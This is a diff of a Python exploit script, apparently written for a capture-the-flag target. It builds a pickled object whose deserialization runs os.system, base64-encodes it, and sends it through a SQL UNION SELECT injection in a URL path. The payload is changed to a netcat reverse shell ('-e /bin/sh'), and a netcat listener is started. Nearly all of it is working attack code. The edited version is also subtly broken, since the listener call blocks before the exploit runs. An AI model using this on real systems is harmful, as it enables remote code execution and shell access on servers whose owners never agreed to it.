@@ -4,8 +4,8 @@ import pickle
 import os
 import requests
 
-# Payload to be executed (copying flag.txt to application/static/)
-payload = "nc -v 10.10.14.16:1337"
+# Payload to be executed (nc reverse shell payload)
+payload = "nc -v 127.0.0.1 1234 -e /bin/sh"
 
 # Exploit class definition
 class Exploit:
@@ -13,10 +13,6 @@ class Exploit:
     # __reduce__ method for serialization and deserialization
     def __reduce__(self):
         return os.system, (payload,)
-
-def listener_task():
-    # Start a listener using nc -lvnp 1337
-    os.system("nc -lvnp 1337")
 
 def exploit(url):
     # Create an instance of the Exploit class
@@ -26,7 +22,7 @@ def exploit(url):
     serialized_payload = base64.b64encode(pickle.dumps(exploit_instance)).decode()
 
     # Construct the final URL by appending the serialized payload
-    final_url = f"{url}/{serialized_payload}"
+    final_url = f"{url}/view/' UNION SELECT '{serialized_payload}"
 
     # Perform a GET request to the constructed URL
     response = requests.get(final_url)
@@ -35,8 +31,8 @@ def exploit(url):
 
 if __name__ == "__main__":
     # Example usage
-    target_url = "https://example.com"  # Replace with the actual target URL
+    target_url = "http://127.0.0.1:1234"  # Replace with the actual target URL
 
-    listener_task()
+os.system("nc -lvnp 1234")
 
-	exploit(target_url)
+exploit(target_url)
